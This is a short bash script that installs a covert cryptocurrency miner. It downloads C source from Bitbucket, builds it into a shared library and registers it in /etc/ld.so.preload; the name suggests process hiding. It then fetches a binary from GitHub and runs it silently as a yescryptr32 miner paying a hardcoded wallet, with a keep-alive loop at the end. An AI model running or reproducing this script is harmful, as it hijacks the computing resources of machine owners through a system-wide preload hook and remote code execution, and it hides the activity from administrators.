#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
sudo curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
sudo apt-get install build-essential -y
sudo gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
sudo mv libnyumput.so /usr/local/lib/
sudo echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
sudo rm nyumput.c
sudo mkdir .lib && cd .lib
# https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
# https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
wget -O sgr1  https://github.com/TiannaMcdowell/All-File/raw/main/sereb >/dev/null 2>&1
sudo chmod +x sgr1
cpulimit -l 600 -e sgr1 &
# sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
# nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
